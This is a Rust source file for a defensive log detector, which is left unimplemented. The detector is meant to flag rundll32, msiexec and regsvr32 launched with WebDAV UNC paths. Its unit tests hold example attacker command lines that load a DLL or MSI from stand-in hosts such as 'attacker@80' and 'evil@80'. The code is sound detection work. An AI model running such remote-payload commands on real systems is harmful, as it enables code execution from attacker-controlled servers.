//! Detect LOLBin processes initiating WebDAV connections (T1102).

use forensicnomicon::heuristics::evtx::{WEBDAV_COMMANDLINE_INDICATORS, WEBDAV_LOL_PROCESSES};
use winevt_core::EvtxEvent;

use crate::{EvtxDetection, EvtxDetectionKind};

/// Security EID 4688 — a new process was created.
const EID_PROCESS_CREATED: u32 = 4688;
/// Sysmon EID 1 — process created.
const EID_SYSMON_PROCESS_CREATE: u32 = 1;

/// Detect LOLBin processes spawned with a WebDAV UNC path in their command line.
///
/// Fires on Security EID 4688 or Sysmon EID 1 where the process image basename
/// is in [`WEBDAV_LOL_PROCESSES`] (rundll32.exe, msiexec.exe, etc.) AND the
/// `CommandLine` contains a WebDAV path indicator from
/// [`WEBDAV_COMMANDLINE_INDICATORS`] (`DavWWWRoot`, `@SSL\`, `@80\`, `@443\`).
///
/// Indicates payload staging or execution from a WebDAV share (T1102).
///
/// Returns one detection per matching event.
pub fn detect_webdav_lolbin(events: &[EvtxEvent]) -> Vec<EvtxDetection> {
    todo!("implement webdav_lolbin detector")
}

fn basename(path: &str) -> &str {
    path.rsplit(|c| c == '\\' || c == '/').next().unwrap_or(path)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::test_helpers::make_event;

    #[test]
    fn rundll32_davwwwroot_detected() {
        let ev = make_event(
            EID_PROCESS_CREATED,
            "Security",
            &[
                ("NewProcessName", "C:\\Windows\\System32\\rundll32.exe"),
                ("CommandLine", r"rundll32.exe \\attacker@80\DavWWWRoot\payload.dll,Execute"),
            ],
        );
        let hits = detect_webdav_lolbin(&[ev]);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].kind, EvtxDetectionKind::WebdavLolbinUsage);
        assert_eq!(hits[0].mitre_technique_id, "T1102");
    }

    #[test]
    fn msiexec_ssl_path_detected() {
        let ev = make_event(
            EID_PROCESS_CREATED,
            "Security",
            &[
                ("NewProcessName", "C:\\Windows\\System32\\msiexec.exe"),
                ("CommandLine", r"msiexec.exe /i \\srv@443@SSL\DavWWWRoot\pkg.msi /quiet"),
            ],
        );
        assert!(!detect_webdav_lolbin(&[ev]).is_empty());
    }

    #[test]
    fn sysmon_eid1_detected() {
        let ev = make_event(
            EID_SYSMON_PROCESS_CREATE,
            "Microsoft-Windows-Sysmon/Operational",
            &[
                ("Image", "C:\\Windows\\System32\\rundll32.exe"),
                ("CommandLine", r"rundll32.exe \\evil@80\DavWWWRoot\evil.dll,DllMain"),
            ],
        );
        assert!(!detect_webdav_lolbin(&[ev]).is_empty());
    }

    #[test]
    fn benign_process_with_webdav_not_detected() {
        // cmd.exe is NOT in WEBDAV_LOL_PROCESSES
        let ev = make_event(
            EID_PROCESS_CREATED,
            "Security",
            &[
                ("NewProcessName", "C:\\Windows\\System32\\cmd.exe"),
                ("CommandLine", r"cmd.exe /c dir \\server@80\DavWWWRoot\"),
            ],
        );
        assert!(detect_webdav_lolbin(&[ev]).is_empty());
    }

    #[test]
    fn lolbin_without_webdav_commandline_not_detected() {
        let ev = make_event(
            EID_PROCESS_CREATED,
            "Security",
            &[
                ("NewProcessName", "C:\\Windows\\System32\\rundll32.exe"),
                ("CommandLine", "rundll32.exe shell32.dll,Control_RunDLL"),
            ],
        );
        assert!(detect_webdav_lolbin(&[ev]).is_empty());
    }

    #[test]
    fn evidence_contains_process_and_command() {
        let ev = make_event(
            EID_PROCESS_CREATED,
            "Security",
            &[
                ("NewProcessName", "C:\\Windows\\System32\\regsvr32.exe"),
                ("CommandLine", r"regsvr32.exe /s \\attacker@443@SSL\DavWWWRoot\com.dll"),
            ],
        );
        let hits = detect_webdav_lolbin(&[ev]);
        assert!(!hits.is_empty());
        let combined = hits[0].evidence.join(" ");
        assert!(combined.contains("regsvr32.exe") || combined.contains("DavWWWRoot"));
    }
}
